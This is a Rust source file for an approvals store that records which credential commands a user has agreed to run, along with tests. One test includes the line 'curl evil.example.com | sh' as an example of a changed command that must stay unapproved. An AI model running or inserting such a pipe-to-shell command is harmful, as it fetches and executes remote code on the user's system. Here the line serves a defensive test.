use std::collections::HashMap;
use std::fs;
use std::path::PathBuf;

use crate::error::Error;
use crate::secrets::SecretKey;

/// Credential commands the user has agreed to run, persisted in the data dir.
/// Holds the approved command line rather than a flag: a command that changed
/// since (edited, or replaced by a later import) is a different command.
///
/// Deliberately outside the profiles: an import writes profiles, and must not
/// be able to write its own approval.
pub struct CommandApprovalsStore {
  path: PathBuf,
  approved: HashMap<String, String>,
}

impl CommandApprovalsStore {
  pub fn load(path: PathBuf) -> Result<Self, Error> {
    let approved = match fs::read_to_string(&path) {
      Ok(raw) => serde_json::from_str(&raw)?,
      Err(err) if err.kind() == std::io::ErrorKind::NotFound => HashMap::new(),
      Err(err) => return Err(err.into()),
    };
    Ok(Self { path, approved })
  }

  pub fn is_approved(&self, key: &SecretKey, command: &str) -> bool {
    self
      .approved
      .get(&key.storage_id())
      .is_some_and(|approved| approved == command)
  }

  pub fn approve(&mut self, key: &SecretKey, command: &str) -> Result<(), Error> {
    self.approved.insert(key.storage_id(), command.to_string());
    self.save()
  }

  pub fn revoke(&mut self, key: &SecretKey) -> Result<(), Error> {
    self.approved.remove(&key.storage_id());
    self.save()
  }

  fn save(&self) -> Result<(), Error> {
    if let Some(dir) = self.path.parent() {
      fs::create_dir_all(dir)?;
    }
    fs::write(&self.path, serde_json::to_string_pretty(&self.approved)?)?;
    Ok(())
  }
}

#[cfg(test)]
mod tests {
  use super::*;

  fn key() -> SecretKey {
    SecretKey::Connection("c-1".to_string())
  }

  #[test]
  fn approve_and_reload_roundtrip() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("command_approvals.json");

    let mut store = CommandApprovalsStore::load(path.clone()).unwrap();
    assert!(!store.is_approved(&key(), "aws rds token"));
    store.approve(&key(), "aws rds token").unwrap();

    let reloaded = CommandApprovalsStore::load(path).unwrap();
    assert!(reloaded.is_approved(&key(), "aws rds token"));
    // Same connection, another key space: nothing to inherit.
    assert!(!reloaded.is_approved(&SecretKey::Tunnel("c-1".to_string()), "aws rds token"));
  }

  #[test]
  fn a_command_that_changed_is_not_the_one_that_was_approved() {
    let dir = tempfile::tempdir().unwrap();
    let mut store = CommandApprovalsStore::load(dir.path().join("command_approvals.json")).unwrap();
    store.approve(&key(), "aws rds token").unwrap();

    assert!(!store.is_approved(&key(), "curl evil.example.com | sh"));
    // Approving the new line replaces the old one rather than adding to it.
    store.approve(&key(), "vault read db").unwrap();
    assert!(!store.is_approved(&key(), "aws rds token"));
    assert!(store.is_approved(&key(), "vault read db"));
  }

  #[test]
  fn revoking_puts_it_back_in_waiting() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("command_approvals.json");
    let mut store = CommandApprovalsStore::load(path.clone()).unwrap();
    store.approve(&key(), "aws rds token").unwrap();

    store.revoke(&key()).unwrap();
    assert!(!store.is_approved(&key(), "aws rds token"));
    assert!(!CommandApprovalsStore::load(path)
      .unwrap()
      .is_approved(&key(), "aws rds token"));
  }
}
